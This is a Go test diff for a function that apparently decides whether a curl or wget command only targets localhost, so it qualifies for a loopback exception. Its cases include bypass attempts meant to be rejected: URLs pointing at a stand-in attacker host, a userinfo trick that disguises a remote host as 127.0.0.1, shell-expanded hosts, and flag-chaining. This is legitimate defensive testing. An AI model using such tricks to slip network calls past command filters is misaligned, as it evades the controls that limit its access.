@@ -130,3 +130,36 @@ func TestLoopbackCarveOutRejectsConnectionRedirectFlags(t *testing.T) {
 		}
 	}
 }
+
+// TestLoopbackDataValueWithEmbeddedLoopbackURL: a curl data value may embed a URL
+// (a JSON body naming a callback). That URL is request data, so it keeps the
+// loopback carve-out only when every embedded URL is on-host. Any remote,
+// userinfo-smuggled, expanded, non-http or data-flag-chained URL voids it, and a
+// non-curl binary keeps the old "://" rule.
+func TestLoopbackDataValueWithEmbeddedLoopbackURL(t *testing.T) {
+	cases := []struct {
+		name string
+		cmd  string
+		want bool
+	}{
+		{"json body with loopback callback", `curl -s -X POST http://127.0.0.1:4097/api/browse/grant -H "Content-Type: application/json" -d "{\"state_key\":\"tab:probe\",\"url\":\"http://127.0.0.1:8123/\"}"`, true},
+		{"single-quoted json body loopback callback", `curl -s -X POST http://127.0.0.1:4097/api/browse/grant -d '{"url":"http://127.0.0.1:8123/"}'`, true},
+		{"localhost callback in form value", `curl -d 'cb=http://localhost:3000/done' http://localhost:4096/x`, true},
+		{"json flag with two loopback URLs", `curl --json '{"a":"http://127.0.0.1:1/","b":"https://localhost/x"}' http://127.0.0.1:4096/x`, true},
+
+		{"remote url in body", `curl -d '{"url":"https://evil.example.com/"}' http://127.0.0.1:4096/x`, false},
+		{"mixed loopback and remote urls in body", `curl -d '{"a":"http://127.0.0.1:1/","b":"https://evil.example.com/"}' http://127.0.0.1:4096/x`, false},
+		{"userinfo trick in body", `curl -d '{"url":"http://127.0.0.1@evil.example.com/"}' http://127.0.0.1:4096/x`, false},
+		{"expansion host in body", `curl -d '{"url":"http://$h/"}' http://127.0.0.1:4096/x`, false},
+		{"non-http scheme in body", `curl -d '{"url":"ftp://127.0.0.1/"}' http://127.0.0.1:4096/x`, false},
+		{"wget -d takes no value", `wget -d 'evil.example.com/?u=http://127.0.0.1/'`, false},
+		{"wget -d json body keeps old rule", `wget -d '{"url":"http://127.0.0.1:8123/"}' http://127.0.0.1:4096/x`, false},
+		{"-d is the value of -o", `curl -o -d 'evil.example.com/?u=http://127.0.0.1/' http://127.0.0.1:4096/x`, false},
+		{"real target remote", `curl -d '{"url":"http://127.0.0.1:8123/"}' https://evil.example.com/x`, false},
+	}
+	for _, tc := range cases {
+		if got := subprocessTargetsLocalhost(tc.cmd); got != tc.want {
+			t.Errorf("%s: subprocessTargetsLocalhost(%q) = %v, want %v", tc.name, tc.cmd, got, tc.want)
+		}
+	}
+}
